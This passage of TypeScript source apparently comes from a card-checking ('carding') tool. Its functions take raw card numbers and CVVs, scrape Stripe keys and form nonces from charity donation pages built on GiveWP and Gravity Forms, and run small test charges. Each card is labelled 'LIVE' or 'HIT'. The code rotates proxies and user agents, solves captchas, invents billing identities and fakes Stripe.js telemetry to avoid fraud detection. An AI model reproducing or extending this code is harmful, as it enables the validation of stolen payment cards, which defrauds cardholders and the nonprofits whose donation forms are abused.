          if (!giveFormHashUserRegister) {
            const urh = html.match(/name="give-form-user-register-hash"[^>]*value="([^"]+)"/)
              || html.match(/value="([^"]+)"[^>]*name="give-form-user-register-hash"/);
            if (urh) giveFormHashUserRegister = urh[1];
          }
          if (!giveFormIdPrefix) {
            const prefix = html.match(/name="give-form-id-prefix"[^>]*value="([^"]+)"/)
              || html.match(/value="([^"]+)"[^>]*name="give-form-id-prefix"/);
            if (prefix) giveFormIdPrefix = prefix[1];
          }
          // Mirror the first-pass company-field detection so the refetch path
          // also avoids sending give_company_* on sites where it's disabled.
          if (!formHasCompanyField) {
            formHasCompanyField = /name=["']give_company_(name|option)["']|give-company-fieldset|data-field=["']give-company/i.test(html);
          }
        } catch {}
      }

      const useNonce = formNonce || checkoutNonce;
      const isSubscription = extras?.donationType === "subscription";

      const classicBody = new URLSearchParams({
        action: "give_process_donation",
        give_ajax: "true",
        give_token: tokenId,
        give_stripe_payment_method: "",
        "card_name": name,
        "card_number": cardNumber.trim().slice(-4),
        "card_cvc": cvv.trim(),
        "card_exp_month": month,
        "card_exp_year": year.length === 4 ? year : "20" + year,
        "give-gateway": "stripe",
        "payment-mode": "stripe",
        "give-honeypot": "",
        "give-form-id": detectedFormId || "0",
        "give-form-id-prefix": giveFormIdPrefix || `give-form-${detectedFormId || "0"}-`,
        "give-form-title": giveFormTitle,
        "give-current-url": `${cleanSiteUrl}${donatePath}`,
        "give-form-url": `${cleanSiteUrl}${donatePath}`,
        // Pick a valid amount + price-id from what the form actually accepts.
        // Logic, in order of preference:
        //   1. Form has preset levels AND (custom disabled OR operator did not
        //      override): pick the smallest preset ? guaranteed valid.
        //   2. Form has min/max scraped: clamp the operator's value (or default
        //      5.00) into [min, max].
        //   3. Fall back to legacy defaults.
        // Refs: real failure was "Donation amount $100.00 is invalid" � caused
        // by sending $100 (operator's setting) with give-price-id "0" when the
        // form was preset-only and $100 wasn't in its price levels.
        ...(() => {
          const opAmt = extras?.donateAmount && parseFloat(extras.donateAmount) > 0
            ? parseFloat(extras.donateAmount) : null;
          const lo = formMinAmount || 1.00;
          const hi = formMaxAmount || 999999.00;
          const minStr = lo.toFixed(2);
          const maxStr = hi.toFixed(2);

          // Tier 1: operator's amount matches a known preset ? use that exact
          // (amount, priceId) pair. Guaranteed valid because we scraped it
          // straight from the page's buttons.
          if (opAmt && presetLevels.length > 0) {
            const match = presetLevels.find(p => p.amount && Math.abs(parseFloat(p.amount) - opAmt) < 0.01);
            if (match) {
              return { "give-form-minimum": minStr, "give-form-maximum": maxStr, "give-amount": opAmt.toFixed(2), "give-price-id": match.priceId };
            }
          }

          // Tier 2: NO operator amount ? use the page's rendered default. The
          // form rendered (amount, priceId) together so it's guaranteed valid
          // even when custom amounts are forbidden. This is the path that
          // fixes the capa-hc bug: $100 default with price-id=3 just works.
          if (!opAmt && pageDefaultAmount && pageDefaultPriceId) {
            return {
              "give-form-minimum": minStr,
              "give-form-maximum": maxStr,
              "give-amount":       pageDefaultAmount,
              "give-price-id":     pageDefaultPriceId,
            };
          }

          // Tier 3: operator's amount given, presets exist, no exact match �
          // and custom amounts are disabled ? snap to the CLOSEST preset.
          if (opAmt && presetLevels.length > 0 && !customAmountEnabled) {
            const valid = presetLevels.filter(p => p.amount && parseFloat(p.amount) > 0);
            if (valid.length) {
              const closest = valid.sort((a, b) => Math.abs(parseFloat(a.amount) - opAmt) - Math.abs(parseFloat(b.amount) - opAmt))[0];
              return { "give-form-minimum": minStr, "give-form-maximum": maxStr, "give-amount": closest.amount, "give-price-id": closest.priceId };
            }
          }

          // Tier 4: custom amount allowed � clamp operator amount into form
          // range and send with price-id "0" (= "custom amount").
          let amt = opAmt ?? parseFloat(pageDefaultAmount || "5.00");
          if (amt < lo) amt = lo;
          if (amt > hi) amt = hi;
          return {
            "give-form-minimum": minStr,
            "give-form-maximum": maxStr,
            "give-amount":       amt.toFixed(2),
            "give-price-id":     pageDefaultPriceId || "0",
          };
        })(),
        "give-currency": (extras?.currency || "USD").toUpperCase(),
        "give-cs-prefix": "give-cs-",
        "give-recurring-period": isSubscription ? "month" : "",
        // give-form-hash is the canonical session nonce per shcar.py / ??? ??????6.py
        ...(giveFormHash ? { "give-form-hash": giveFormHash } : {}),
        ...(giveFormHashUserRegister ? { "give-form-user-register-hash": giveFormHashUserRegister } : {}),
        // Guest checkout path � required when site is configured for user registration
        "give-purchase-var": "needs-to-register",
        // Send company fields only when the form actually has them enabled.
        // Sites with the company field DISABLED reject submissions that
        // include these � strict validation: "The company field is not
        // enabled." (e.g. capa-hc.org).
        ...(formHasCompanyField ? { "give_company_option": "no", "give_company_name": "" } : {}),
        "give_first": firstName,
        "give_last": lastName,
        "give_email": email,
        "give_address": extras?.billingAddress || address1,
        "give_city":    extras?.billingCity    || billing.city,
        "give_state":   extras?.billingState   || billing.stateCode,
        "give_zip":     extras?.billingZip     || billing.zip,
        "give_country": extras?.billingCountry || billing.country,
        "give_action": "purchase",
        "give-form-nonce": useNonce,
        "give_checkout_nonce": checkoutNonce,
        // Subscription mode (refs: shcar.py, paycv.py): tells GiveWP to create a
        // SetupIntent with off_session future-usage instead of a one-off PaymentIntent.
        // subscriptionPeriod + subscriptionFrequency are required by the GiveWP
        // recurring plugin � without them the backend rejects the donation silently.
        ...(isSubscription ? {
          "donationType": "subscription",
          "client_context[mode]": "subscription",
          "setup_future_usage": "off_session",
          "give-recurring": "true",
          "subscriptionPeriod": "month",
          "subscriptionFrequency": "1",
        } : {}),
      });

      // Issue the classic POST. GiveWP rejects with `give_error_donation_form_nonce`
      // ("unable to recognize your session") when:
      //   - cookies rotated between the page fetch and POST
      //   - give-form-hash is missing/stale
      //   - the Stripe tok_ is already consumed (single-use)
      // We retry ONCE with a freshly-fetched page (new cookies + new hash) and
      // a freshly-tokenized card. Anything past that is a real site rejection.
      let classicResp = await sessionFetch(ajaxUrl, state, {
        method: "POST",
        body: classicBody.toString(),
        contentType: "application/x-www-form-urlencoded",
        referer: `${cleanSiteUrl}${donatePath}`,
        origin: cleanSiteUrl,
        xRequestedWith: true,
        accept: "application/json",
        maxRetries: 0,
      });
      state = classicResp.state;
      dbg(`[givewp] Classic response (${classicResp.text.length} chars): ${classicResp.text.substring(0, 300)}`);

      // Shared 404 guard � admin-ajax routed to WP's 404 handler. Same
      // misclassification trap WPFS hit; previously this fell through to the
      // tokenize-fallback path with no diagnostic.
      if (looksLike404Response(classicResp.text, classicResp.status)) {
        return {
          status: "error",
          response: `Gateway Error: admin-ajax returned 404 / Page Not Found (status=${classicResp.status}). Card was NOT submitted. Set ajaxUrl in gate settings if the site moved admin-ajax.`,
          code: "givewp_admin_ajax_404",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
          rawSnippet: classicResp.text.slice(0, 500),
        };
      }

      const isNonceError = /give_error_donation_form_nonce|unable to recognize your session|refresh the screen to try again|nonce verification failed/i.test(classicResp.text);
      if (isNonceError) {
        dbg(`[givewp] Nonce error detected � refreshing form-hash + tokenizing fresh tok_ and retrying once`);
        try {
          // Re-fetch the donate page in the SAME session so the new hash is
          // bound to cookies we'll actually send on the retry POST.
          const refresh = await sessionFetch(`${cleanSiteUrl}${donatePath}`, state, { timeout: 8000, maxRetries: 0 });
          state = refresh.state;
          const html2 = refresh.text;
          const grabHash = (re: RegExp) => html2.match(re)?.[1];
          // Try several patterns: standard, per-form-id, and minified-JS variants
          const freshHash =
              grabHash(/name="give-form-hash"[^>]*value="([^"]+)"/)
           || grabHash(/value="([^"]+)"[^>]*name="give-form-hash"/)
           || grabHash(new RegExp(`name="give-form-${detectedFormId}-hash"[^>]*value="([^"]+)"`))
           || grabHash(/"give-form-hash"\s*:\s*"([^"]+)"/);
          if (freshHash) giveFormHash = freshHash;
          const freshNonce =
              grabHash(/name="give-form-nonce"[^>]*value="([^"]+)"/)
           || grabHash(/value="([^"]+)"[^>]*name="give-form-nonce"/);
          if (freshNonce) formNonce = freshNonce;
          const freshCheckout =
              grabHash(/checkout_nonce["']\s*:\s*["']([a-f0-9]+)/)
           || grabHash(/"checkout_nonce"\s*:\s*"([^"]+)"/);
          if (freshCheckout) checkoutNonce = freshCheckout;

          // Re-tokenize � the previous tok_ was consumed by the failed POST.
          const fresh = await stripeTokenize(
            cardNumber.trim(), month, year, cvv.trim(), detectedKey, gateName, cleanSiteUrl, start
          );
          const freshTok = (fresh as any)?.tokenId;
          if (freshTok) {
            classicBody.set("give_token", freshTok);
            const retryNonce = formNonce || checkoutNonce;
            if (retryNonce) classicBody.set("give-form-nonce", retryNonce);
            if (checkoutNonce) classicBody.set("give_checkout_nonce", checkoutNonce);
            if (giveFormHash) classicBody.set("give-form-hash", giveFormHash);
            classicResp = await sessionFetch(ajaxUrl, state, {
              method: "POST",
              body: classicBody.toString(),
              contentType: "application/x-www-form-urlencoded",
              referer: `${cleanSiteUrl}${donatePath}`,
              origin: cleanSiteUrl,
              xRequestedWith: true,
              accept: "application/json",
              maxRetries: 0,
            });
            state = classicResp.state;
            dbg(`[givewp] Retry response (${classicResp.text.length} chars): ${classicResp.text.substring(0, 300)}`);
          } else {
            dbg(`[givewp] Retry skipped � tokenize didn't return a fresh tok_`);
          }
        } catch (retryErr: any) {
          dbg(`[givewp] Retry attempt failed: ${retryErr?.message ?? retryErr}`);
        }
      }

      // Plain-text success � some GiveWP versions / custom handlers literally
      // write "success" or "Success!" to the response body instead of JSON.
      // Caught a real LIVE on capa-hc-style sites being thrown away as
      // "tokenize fallback" because JSON.parse failed on the literal text.
      // Check BEFORE the JSON parse so we never lose this case.
      const trimmedClassic = classicResp.text.trim();
      const isPlainTextSuccess = /^(success|Success|SUCCESS|Success!|ok|OK|true|"success")$/.test(trimmedClassic)
        || (trimmedClassic.length < 60 && classifyStripeResponseTag(trimmedClassic)?.tag === "HIT");
      if (isPlainTextSuccess) {
        dbg(`[givewp] Plain-text success: "${trimmedClassic.slice(0, 40)}" � classifying as LIVE HIT`);
        return {
          status: "live",
          response: formatCardResult({
            tier: "CVV LIVE", mark: "?", detail: "Donation Approved (text)",
            brand: cardMeta.brand, funding: cardMeta.funding, country: cardMeta.country, threeDs: cardMeta.threeDs,
            billingUsed: billing,
          }),
          code: "donation_approved",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
          rawSnippet: classicResp.text.slice(0, 500),
          discoveredSettings: {
            ...(connectedAccount  && connectedAccount  !== extras?.connectedAccount ? { connectedAccount } : {}),
            ...(detectedKey       && detectedKey       !== publicKey                ? { publicKey: detectedKey } : {}),
            ...(detectedFormId    && detectedFormId    !== extras?.giveFormId       ? { giveFormId: detectedFormId } : {}),
            ...(giveFormIdPrefix  && giveFormIdPrefix  !== extras?.giveFormIdPrefix ? { giveFormIdPrefix } : {}),
            ...(donatePath        && donatePath        !== "/donate/"               ? { donatePath } : {}),
          },
        };
      }

      try {
        const classicData = JSON.parse(classicResp.text);

        if (classicData.data?.client_secret || classicData.data?.clientSecret) {
          const clientSecret = classicData.data.client_secret || classicData.data.clientSecret;
          const piId = clientSecret.split("_secret_")[0];
          const intentType = piId.startsWith("seti_") ? "setup_intents" : "payment_intents";
          const confirmBody = new URLSearchParams({
            "payment_method_data[type]": "card",
            "payment_method_data[card][token]": tokenId,
            "payment_method_data[billing_details][name]": name,
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][postal_code]": billing.zip,
            "payment_method_data[billing_details][address][country]": billing.country,
            expected_payment_method_type: "card",
            use_stripe_sdk: "true",
            key: detectedKey,
            client_secret: clientSecret,
          });
          const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/${intentType}/${piId}/confirm`, connectedAccount), {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua, Origin: "https://js.stripe.com", Referer: "https://js.stripe.com/" },
            body: confirmBody.toString(),
          });
          const confirmResult = await confirmResp.json();
          const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, detectedKey, connectedAccount);
          classified.latency = Date.now() - start;
          classified.cardInfo = fullCardInfo;
          // Persist stable values discovered during the scrape. Only fields the
          // operator didn't already have are set � the caller diffs and only
          // writes back when something is genuinely new. Nonces/hashes NOT
          // included on purpose (they invalidate within hours).
          classified.discoveredSettings = {
            ...(connectedAccount  && connectedAccount  !== extras?.connectedAccount ? { connectedAccount } : {}),
            ...(detectedKey       && detectedKey       !== publicKey                ? { publicKey: detectedKey } : {}),
            ...(detectedFormId    && detectedFormId    !== extras?.giveFormId       ? { giveFormId: detectedFormId } : {}),
            ...(giveFormIdPrefix  && giveFormIdPrefix  !== extras?.giveFormIdPrefix ? { giveFormIdPrefix } : {}),
            ...(donatePath        && donatePath        !== "/donate/"               ? { donatePath } : {}),
          };
          return classified;
        }

        if (classicData.success === false) {
          const bankResult = classifyBankText(classicResp.text, gateName, cardMeta);
          if (bankResult.status !== "error") {
            bankResult.latency = Date.now() - start;
            bankResult.cardInfo = fullCardInfo;
            return bankResult;
          }
        }
      } catch {}
    }

    if (donateRoute) {
      dbg(`[givewp] Trying v3 donate route`);
      const isSubscriptionV3 = extras?.donationType === "subscription";

      const pmBody = new URLSearchParams({
        type: "card",
        "billing_details[name]": name,
        "billing_details[email]": email,
        "billing_details[address][postal_code]": billing.zip,
        "billing_details[address][country]": billing.country,
        "card[number]": cardNumber.trim(),
        "card[cvc]": cvv.trim(),
        "card[exp_month]": month,
        "card[exp_year]": year,
        guid: crypto.randomUUID(),
        muid: crypto.randomUUID(),
        sid: crypto.randomUUID(),
        payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; payment-element`,
        referrer: cleanSiteUrl,
        time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
        key: detectedKey,
      });

      const pmResp = await fetch(stripeConnectUrl("https://api.stripe.com/v1/payment_methods", connectedAccount), {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "application/json",
          Origin: "https://js.stripe.com",
          Referer: "https://js.stripe.com/",
          "User-Agent": ua,
        },
        body: pmBody.toString(),
      });
      const pmResult = await pmResp.json();
      const pmId = pmResult.id;

      if (pmId) {
        const donateResp = await sessionFetch(donateRoute, state, {
          method: "POST",
          body: JSON.stringify({
            gatewayId: "stripe_payment_element",
            amount: 500,
            currency: "USD",
            formId: parseInt(detectedFormId) || 1,
            formTitle: "Donation",
            firstName,
            lastName,
            email,
            company: "",
            "gatewayData.stripePaymentMethod": pmId,
            originUrl: `${cleanSiteUrl}${donatePath}`,
            // Subscription mode (refs: shcar.py, paycv.py) � opt-in via extras.donationType
            ...(isSubscriptionV3 ? {
              donationType: "subscription",
              "client_context[mode]": "subscription",
              setup_future_usage: "off_session",
              subscriptionPeriod: "month",
              subscriptionFrequency: "1",
            } : {}),
          }),
          contentType: "application/json",
          referer: `${cleanSiteUrl}${donatePath}`,
          origin: cleanSiteUrl,
          accept: "application/json",
          xRequestedWith: true,
          maxRetries: 0,
        });

        dbg(`[givewp] v3 Donate response (${donateResp.text.length} chars): ${donateResp.text.substring(0, 200)}`);

        try {
          const donateData = JSON.parse(donateResp.text);
          if (donateData.success === true && donateData.data?.clientSecret) {
            const clientSecret = donateData.data.clientSecret;
            const piId = clientSecret.split("_secret_")[0];
            const confirmBody = new URLSearchParams({
              payment_method: pmId,
              expected_payment_method_type: "card",
              use_stripe_sdk: "true",
              key: detectedKey,
              client_secret: clientSecret,
            });
            const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, connectedAccount), {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua, Origin: "https://js.stripe.com", Referer: "https://js.stripe.com/" },
              body: confirmBody.toString(),
            });
            const confirmResult = await confirmResp.json();
            const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, detectedKey, connectedAccount);
            classified.latency = Date.now() - start;
            classified.cardInfo = fullCardInfo;
            return classified;
          }

          if (donateData.success === false) {
            const bankResult = classifyBankText(donateResp.text, gateName, cardMeta);
            if (bankResult.status !== "error") {
              bankResult.latency = Date.now() - start;
              bankResult.cardInfo = fullCardInfo;
              return bankResult;
            }
          }
        } catch {}
      }
    }

    dbg(`[givewp] All GiveWP approaches failed, returning tokenize result`);
    return {
      status: "error",
      response: `CCN ? Tokenized | CVV UNCHECKED | ${cardMeta.brand} ${cardMeta.funding} [${cardMeta.country}] ${cardMeta.threeDs} | Checkout Failed | ${tokenId}`,
      code: "tokenized_no_checkout",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };

  } catch (e: any) {
    return { status: "error", response: `GiveWP Error: ${e.message}`, code: "givewp_error", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  }
}

export async function checkCardStripeGravityForms(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  gfFormId?: string,
  gfPiNonce?: string,
  extras?: GateExtras
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 2) year = "20" + year;
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name      = extras?.billingName  || rndName();
  const email     = extras?.billingEmail || rndEmail();
  const stripeVer = pick(STRIPE_JS_VERSIONS);
  const nameParts = name.split(" ");
  const firstName = nameParts[0];
  const lastName  = nameParts.slice(1).join(" ") || "Smith";

  try {
    let state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };
    let detectedKey = publicKey;
    let formId = gfFormId || "";
    let piNonce = extras?.gfPiNonce || gfPiNonce || "";  // pre-seed from extras
    let feedPublishableKey = "";
    let lastCrawledPath = "";
    let connectedAccount = extras?.connectedAccount || "";   // Stripe Connect acct_...
    // Fields specific to the gfstripe_validate_form action (ref: ??? ??????2.py).
    // Modern Gravity Forms + Stripe creates the PI as a side-effect of validating
    // the multi-step form, not via a separate create_payment_intent endpoint.
    let gfState = "";
    let gfVersionHash = "";
    let gfFeedId = "";
    let gfStripeTempHash = "";

    const extraPaths: string[] = [];
    try {
      const homeResp = await sessionFetch(`${cleanSiteUrl}/`, state);
      state = homeResp.state;
      if (homeResp.ok) {
        const donateLinks = homeResp.text.match(/href=["']([^"']*donat[^"']*)/gi) || [];
        for (const link of donateLinks) {
          const href = link.replace(/href=["']/i, "").replace(/["']$/, "");
          try {
            const u = new URL(href, cleanSiteUrl);
            if (u.hostname === new URL(cleanSiteUrl).hostname) {
              const p = u.pathname.replace(/#.*$/, "");
              if (p && !extraPaths.includes(p)) extraPaths.push(p);
            }
          } catch {}
        }
      }
    } catch {}

    const pagePaths = [...new Set([...extraPaths, "/donate/", "/donate-now/", "/give/", "/support/", "/"])];
    for (const path of pagePaths) {
      try {
        const resp = await sessionFetch(`${cleanSiteUrl}${path}`, state);
        state = resp.state;
        if (resp.text.startsWith("CAPTCHA_BLOCKED")) {
          return { status: "error", response: resp.text, code: "captcha_blocked", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
        }
        if (!resp.ok) continue;

        const gfStripeMatch = resp.text.match(/gform_stripe_theme_js_strings\s*=\s*(\{[^;]+\})/);
        if (gfStripeMatch) {
          try {
            const gfVars = JSON.parse(gfStripeMatch[1]);
            if (gfVars.publishable_key) detectedKey = gfVars.publishable_key;
            if (gfVars.create_payment_intent_nonce) piNonce = gfVars.create_payment_intent_nonce;
          } catch {}
        }

        const feedMatch = resp.text.match(/GFFrontendFeeds\(\s*(\{[^;]+\})\s*\)/);
        if (feedMatch) {
          try {
            const feedData = JSON.parse(feedMatch[1]);
            if (feedData.formId) formId = String(feedData.formId);
            if (feedData.feeds?.length > 0) {
              for (const feed of feedData.feeds) {
                if (feed.transactionType === "product" || !feed.conditionalLogic) {
                  feedPublishableKey = feed.publishableKey || "";
                  break;
                }
              }
              if (!feedPublishableKey && feedData.feeds[0].publishableKey) {
                feedPublishableKey = feedData.feeds[0].publishableKey;
              }
            }
          } catch {}
        }

        // Widened fallback when GFFrontendFeeds isn't present � older GF, themed
        // forms, or AJAX-loaded forms expose the form-id in 5 other places.
        // Mirrors the detector so any page that auto-detects also scrapes here.
        if (!formId) {
          const gfPatterns: RegExp[] = [
            /name=['"]gform_submit['"][^>]*value=['"](\d+)['"]/,
            /value=['"](\d+)['"][^>]*name=['"]gform_submit['"]/,
            /<form[^>]+id=['"]gform_(\d+)['"]/,
            /class=['"][^'"]*\bgform_wrapper_(\d+)\b[^'"]*['"]/,
            /name=['"]is_submit_(\d+)['"]/,
            /data-formid=['"](\d+)['"]/,
            /data-form-index=['"](\d+)['"]/,
          ];
          for (const pat of gfPatterns) {
            const m = resp.text.match(pat);
            if (m && m[1]) { formId = m[1]; break; }
          }
        }

        if (!detectedKey) {
          const keyMatch = resp.text.match(/pk_live_[a-zA-Z0-9_-]{20,}/);
          if (keyMatch) detectedKey = keyMatch[0];
        }
        if (!connectedAccount) {
          const acctMatch = resp.text.match(/"stripe_account"\s*:\s*"(acct_[A-Za-z0-9_-]+)"/);
          connectedAccount = acctMatch?.[1] || resp.text.match(/\bacct_[A-Za-z0-9_-]{8,}\b/)?.[0] || "";
          if (connectedAccount) dbg(`[gravityforms] Found connected account: ${connectedAccount}`);
        }

        // Extract fields needed for the gfstripe_validate_form action.
        if (!gfState) {
          const stateMatch = resp.text.match(/name=["']state_(\d+)["']\s+value=["']([^"']+)["']/)
            || resp.text.match(/name=["']state_(\d+)["'][^>]*value=["']([^"']+)["']/);
          if (stateMatch) gfState = stateMatch[2];
        }
        if (!gfVersionHash) {
          const vhMatch = resp.text.match(/name=["']version_hash["']\s+value=["']([^"']+)["']/)
            || resp.text.match(/value=["']([^"']+)["'][^>]*name=["']version_hash["']/);
          if (vhMatch) gfVersionHash = vhMatch[1];
        }
        if (!gfFeedId) {
          const fidMatch = resp.text.match(/"feed_id"\s*:\s*"?(\d+)"?/)
            || resp.text.match(/data-feed-id=["'](\d+)["']/);
          if (fidMatch) gfFeedId = fidMatch[1];
        }
        if (!gfStripeTempHash) {
          // Embedded in the gform-stripe init script as hash=... in the form temp data.
          const stripeTempMatch = resp.text.match(/hash=([a-f0-9]{16,})/i);
          if (stripeTempMatch) gfStripeTempHash = stripeTempMatch[1];
        }

        if (piNonce) {
          lastCrawledPath = path;
        }
        // Break when we have a key AND a freshly-scraped nonce (not the same as the stored one).
        // If we still have the pre-seeded (potentially stale) nonce, keep scanning for a fresh one.
        const storedNonce = extras?.gfPiNonce || gfPiNonce || "";
        const hasFreshNonce = piNonce && (!storedNonce || piNonce !== storedNonce);
        if ((detectedKey || feedPublishableKey) && (hasFreshNonce || !storedNonce)) break;
      } catch {}
    }

    const stripeKey = feedPublishableKey || detectedKey;
    if (!stripeKey) {
      return { status: "error", response: "No Stripe key found on GF site", code: "no_stripe_key", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
    }

    const pmBody = new URLSearchParams({
      type: "card",
      "billing_details[name]": name,
      "billing_details[email]": email,
      "billing_details[address][line1]": extras?.billingAddress || (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
      "billing_details[address][city]":         extras?.billingCity    || billing.city,
      "billing_details[address][state]":        extras?.billingState   || billing.stateCode,
      "billing_details[address][postal_code]":  extras?.billingZip     || billing.zip,
      "billing_details[address][country]":      extras?.billingCountry || billing.country,
      "card[number]": cardNumber.trim(),
      "card[cvc]": cvv.trim(),
      "card[exp_month]": month,
      "card[exp_year]": year,
      guid: crypto.randomUUID(),
      muid: crypto.randomUUID(),
      sid: crypto.randomUUID(),
      payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; card-element`,
      referrer: cleanSiteUrl,
      time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
      key: stripeKey,
    });
    if (extras?.billingPhone) pmBody.append("billing_details[phone]", extras.billingPhone);

    const pmResp = await fetch(stripeConnectUrl("https://api.stripe.com/v1/payment_methods", connectedAccount), {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
        Origin: "https://js.stripe.com",
        Referer: "https://js.stripe.com/",
        "User-Agent": ua,
      },
      body: pmBody.toString(),
    });
    const pmResult = await pmResp.json();
    const pmId = pmResult.id;
    const card = pmResult.card || {};
    const brand = (card.brand || detectBrandFromBin(cardNumber.trim())).toUpperCase();
    const funding = card.funding || "unknown";
    const country = card.country || "??";
    const threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
    const cardMeta = { brand, funding, country, threeDs, billing };

    if (!pmId) {
      if (pmResult.error) {
        const classified = classifyStripeResponse(pmResult, gateName, cardMeta);
        classified.latency = Date.now() - start;
        classified.cardInfo = fullCardInfo;
        return classified;
      }
      return { status: "error", response: "Stripe tokenization failed", code: "tokenize_failed", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
    }

    dbg(`[gravityforms] Got PM ${pmId}, trying GF AJAX PI creation`);

    // Preferred path on modern GF + Stripe sites (ref: ??? ??????2.py).
    // Validates the form server-side, which is what actually creates the
    // PaymentIntent and returns its client_secret. Far more reliable than
    // the legacy create_payment_intent action, which most sites don't ship.
    if (piNonce && gfVersionHash && gfState && formId) {
      try {
        const refererPath = lastCrawledPath || "/donate/";
        const tempHash = gfStripeTempHash || crypto.randomBytes(16).toString("hex");
        const validateBody = new URLSearchParams({
          state_2: gfState,
          gform_target_page_number_2: "0",
          gform_source_page_number_2: "3",
          gform_field_values: "",
          version_hash: gfVersionHash,
          action: "gfstripe_validate_form",
          feed_id: gfFeedId || "1",
          form_id: formId,
          tracking_id: crypto.randomBytes(4).toString("hex"),
          payment_method: "card",
          nonce: piNonce,
          "gform_ajax--stripe-temp": `form_id=${formId}&title=&description=&tabindex=0&theme=legacy&hash=${tempHash}`,
        });
        const valResp = await sessionFetch(`${cleanSiteUrl}/wp-admin/admin-ajax.php`, state, {
          method: "POST",
          body: validateBody.toString(),
          contentType: "application/x-www-form-urlencoded",
          referer: `${cleanSiteUrl}${refererPath}`,
          origin: cleanSiteUrl,
          accept: "*/*",
          xRequestedWith: true,
        });
        state = valResp.state;
        dbg(`[gravityforms] validate_form response (${valResp.text.length} chars): ${valResp.text.substring(0, 200)}`);
        if (valResp.text && valResp.text !== "0" && valResp.text !== "-1") {
          try {
            const valData = JSON.parse(valResp.text);
            // Two shapes: { data: { intent: { id, client_secret }, resume_token } }
            // or         { data: { client_secret, resume_token } }
            const intent = valData?.data?.intent || valData?.data;
            const clientSecret = intent?.client_secret || valData?.data?.client_secret;
            const resumeToken = valData?.data?.resume_token || valData?.data?.resumeToken || "";
            if (clientSecret) {
              const piId = clientSecret.split("_secret_")[0];
              const confirmBody = new URLSearchParams({
                payment_method: pmId,
                expected_payment_method_type: "card",
                use_stripe_sdk: "true",
                key: stripeKey,
                client_secret: clientSecret,
                ...(resumeToken ? { return_url: `${cleanSiteUrl}/?gf-stripe-saas-return=1&resume_token=${resumeToken}` } : {}),
              });
              const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, connectedAccount), {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua, Origin: "https://js.stripe.com", Referer: "https://js.stripe.com/" },
                body: confirmBody.toString(),
              });
              const confirmResult = await confirmResp.json();
              const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, stripeKey, connectedAccount);
              classified.latency = Date.now() - start;
              classified.cardInfo = fullCardInfo;
              return classified;
            }
          } catch (parseErr: any) {
            dbg(`[gravityforms] validate_form JSON parse failed: ${parseErr?.message ?? parseErr}`);
          }
        }
      } catch (e: any) {
        dbg(`[gravityforms] validate_form attempt errored: ${e?.message ?? e}`);
      }
    }

    if (piNonce) {
      const gfPiActions = [
        "gfstripe_create_payment_intent",
        "gpstripe_create_payment_intent",
        "gf_stripe_create_payment_intent",
      ];

      for (const gfAction of gfPiActions) {
        try {
          const piBody = new URLSearchParams({
            action: gfAction,
            nonce: piNonce,
            form_id: formId,
            payment_method: pmId,
            amount: String(Math.round(parseFloat(clampAmount(extras?.donateAmount, "1.00")) * 100)),
            currency: (extras?.currency || "usd").toLowerCase(),
            description: `Donation - ${email}`,
            "billing_details[name]": name,
            "billing_details[email]": email,
            "billing_details[address][postal_code]": extras?.billingZip || billing.zip,
            "billing_details[address][country]":     extras?.billingCountry || billing.country,
          });

          const refererPath = lastCrawledPath || "/donate/";
          const piResp = await sessionFetch(`${cleanSiteUrl}/wp-admin/admin-ajax.php`, state, {
            method: "POST",
            body: piBody.toString(),
            contentType: "application/x-www-form-urlencoded",
            referer: `${cleanSiteUrl}${refererPath}`,
            origin: cleanSiteUrl,
            accept: "application/json",
            xRequestedWith: true,
          });

          dbg(`[gravityforms] PI response for ${gfAction} (${piResp.text.length} chars): ${piResp.text.substring(0, 200)}`);

          if (piResp.text === "0" || piResp.text === "-1") continue;

          const piData = JSON.parse(piResp.text);
          if (piData.success && piData.data?.client_secret) {
            const clientSecret = piData.data.client_secret;
            const resumeToken: string = piData.data?.resume_token || piData.data?.resumeToken || "";
            const piId = clientSecret.split("_secret_")[0];
            const confirmBody = new URLSearchParams({
              payment_method: pmId,
              expected_payment_method_type: "card",
              use_stripe_sdk: "true",
              key: stripeKey,
              client_secret: clientSecret,
